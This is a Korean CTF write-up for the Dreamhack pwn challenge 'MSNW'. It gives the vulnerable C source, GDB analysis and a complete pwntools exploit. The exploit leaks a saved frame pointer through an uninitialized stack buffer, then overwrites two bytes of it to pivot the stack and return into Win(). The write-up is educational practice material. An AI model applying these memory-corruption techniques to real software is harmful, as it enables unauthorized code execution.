---
title: "MSNW writeup"
date: 2026-03-22 05:00:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, sfp_overwrite, stack_leak, dreamhack]
---

`Nyang()`의 초기화되지 않은 버퍼를 이용해 SFP를 유출하고, `Meong()`의 2바이트 SFP 덮어쓰기로 `Win()`을 실행하는 문제다.

## Analysis

### checksec
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

카나리가 없고 PIE도 꺼져 있다. NX는 활성화되어 있으므로 셸코드를 직접 실행하는 방식은 불가능하지만, 바이너리 내에 `Win()` 함수가 존재하므로 해당 주소로 리턴할 수 있다.

### Source Code
```c
/* msnw.c
 * gcc -no-pie -fno-stack-protector -mpreferred-stack-boundary=8 msnw.c -o msnw
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MEONG 0
#define NYANG 1

#define NOT_QUIT 1
#define QUIT 0

void Init() {
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stderr, 0, _IONBF, 0);
}

int Meong() {
    char buf[0x40];

    memset(buf, 0x00, 0x130);

    printf("meong 🐶: ");
    read(0, buf, 0x132);

    if (buf[0] == 'q')
        return QUIT;
    return NOT_QUIT;
}

int Nyang() {
    char buf[0x40];

    printf("nyang 🐱: ");
    printf("%s", buf);

    return NOT_QUIT;
}

int Call(int animal) {
    return animal == MEONG ? Meong() : Nyang();
}

void Echo() {
    while (Call(MEONG)) Call(NYANG);
}

void Win() {
    execl("/bin/cat", "/bin/cat", "./flag", NULL);
}

int main(void) {
    Init();

    Echo();
    puts("nyang 🐱: goodbye!");

    return 0;
}
```

`Echo()`는 `Call(MEONG)` -> `Call(NYANG)`을 루프로 반복한다.

## Vulnerability Analysis

ASLR로 인해 매핑되는 위치가 달라지더라도 페이지 오프셋인 하위 12비트는 변하지 않는다. 따라서 GDB에서 동적 분석으로 `Call()`의 rbp 하위 12비트를 알아낼 수 있다.
```
gdb -q msnw
pwndbg> b *Call+8
Breakpoint 1 at 0x401300
pwndbg> r
pwndbg> p $rbp
$1 = (void *) 0x7fffffffdaf0

```

하위 12비트는 `0xaf0`임을 알 수 있다. 

그러나 `Meong()`에서는 바이트 단위로만 덮어쓸 수 있기 때문에 2바이트를 덮어야 하고, 따라서 ASLR에 의해 변할 수 있는 비트 12~15를 leak하거나 무차별 대입으로 1/16 확률로 성공해야 한다. 

이 문제의 경우 SFP 하위 2바이트의 각 바이트가 모두 0이 아님을 확인할 수 있으므로 `Nyang()`을 통해 쉽게 유출할 수 있다.

`Meong()`과 `Nyang()` 둘 다 `Call()`에서 호출되므로 두 함수 호출 시 `Call()`의 rbp, 즉 두 함수에서의 SFP는 동일하다. `Echo()`의 루프 구조를 보면 `Call(MEONG)` -> `Call(NYANG)` 순서로 호출되며 두 호출은 동일한 스택 영역을 재사용한다. 

따라서 `Meong()`에서 `buf`를 `A`로 가득 채워두면, 이후 `Nyang()`이 호출될 때 `Nyang()`의 `buf`는 초기화되지 않은 상태로 `Meong()`이 채워둔 영역과 겹친다. `Nyang()`의 `printf("%s", buf)`는 널 터미네이터를 만날 때까지 출력하므로 `A`들을 지나 SFP 영역까지 출력된다. 단, 스택 중간에 0이 있으면 출력이 끊기므로 `Meong()`에서 SFP 앞까지 0이 아닌 값으로 채워주는 것이 중요하다.

## Exploit


SFP를 조작하면 caller가 `leave`할 때 조작한 SFP 값으로 rsp가 변경된다. 즉, `Call()`이 `leave`할 때 rsp가 조작한 SFP로 변경되고, 그 위치에서 8바이트를 읽어 rbp에 넣은 뒤, SFP+8에서 8바이트를 읽어 그곳으로 점프한다. 

이 문제에서 원하는 값을 입력할 수 있는 유일한 수단은 `Meong()`의 `buf`이다. 따라서 `buf`에 `Win()`의 주소를 넣고, 해당 위치 - 8을 sfp로 지정해야 한다.

`Call()`의 rbp에서 `Meong()`의 buf까지의 거리를 GDB로 구한다.
```
pwndbg> b *Meong+4
pwndbg> p $rbp
$1 = (void *) 0x7fffffffd8f0   (Meong의 rbp)
pwndbg> p $rbp-0x130
$5 = (void *) 0x7fffffffd7c0   (Meong의 buf 주소)

# Call()의 rbp(0x7fffffffdaf0)에서 buf까지의 거리 계산
pwndbg> p/x 0x7fffffffdaf0 - 0x7fffffffd7c0
$6 = 0x330
```

거리가 `0x330`이고 기존 SFP의 하위 12비트가 `0xaf0`이므로 언더플로 없이 처리 가능하다.

`execl`은 내부적으로 SIMD 명령어를 사용하므로 진입 시 rsp가 16바이트 정렬되어 있어야 한다. 일반적으로 `call` 명령어로 함수에 진입하면 리턴 주소가 push되어 정렬이 맞춰지지만, 여기서는 `ret`으로 `Win()`에 진입하므로 리턴 주소가 push되지 않아 rsp 정렬 상태가 달라진다. `sfp = buf + 8`로 설정하면 자연스럽게 진입 시 rsp가 16바이트 정렬되어 이 문제를 해결할 수 있다.
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./deploy/msnw")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 9525)

    return r


def main():
    r = conn()

    payload = b"A" * 0x130

    r.sendafter(b": ", payload)
    r.recvuntil(payload)
    sfp_lower2 = u16(r.recvn(2))

    payload = b"A" * 16
    payload += p64(exe.symbols["Win"])
    payload += b"A" * (0x130 - len(payload))
    payload += p16(sfp_lower2 - 0x328)

    r.sendafter(b": ", payload)

    r.interactive()


if __name__ == "__main__":
    main()
```